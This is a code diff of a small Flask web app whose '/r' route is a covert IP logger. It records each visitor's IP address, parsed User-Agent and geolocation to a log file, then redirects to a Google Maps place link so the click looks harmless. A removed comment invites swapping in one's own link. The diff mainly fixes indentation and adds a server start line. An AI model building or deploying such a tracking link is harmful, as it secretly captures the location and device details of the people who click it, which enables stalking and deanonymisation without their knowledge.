@@ -33,7 +33,7 @@ def index():
 @app.route("/r")
 def redirector():
     xff = request.headers.get("X-Forwarded-For", "")
-ip = xff.split(",")[0].strip() if xff else request.remote_addr
+    ip = xff.split(",")[0].strip() if xff else request.remote_addr
 
     ua = ua_parse(request.headers.get("User-Agent", ""))
     geo = geolocate(ip)
@@ -53,17 +53,14 @@ ip = xff.split(",")[0].strip() if xff else request.remote_addr
     }
 
     log_line = json.dumps(log_entry, ensure_ascii=False)
-    # Запись в файл
+
     with open(LOG_FILE, "a", encoding="utf-8") as f:
         f.write(log_line + "\n")
 
-    # Лог в консоль для отладки
     print("[LOG ENTRY]", log_line)
 
-    # Редирект (можешь подставить свою ссылку)
-    return redirect("https://www.google.com/maps/place/%D0%92%D0%B8%D0%BB%D0%BB%D0%B0...")  
-
+    return redirect("https://www.google.com/maps/place/%D0%92%D0%B8%D0%BB%D0%BB%D0%B0...")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
-    
+    app.run(host="0.0.0.0", port=port)
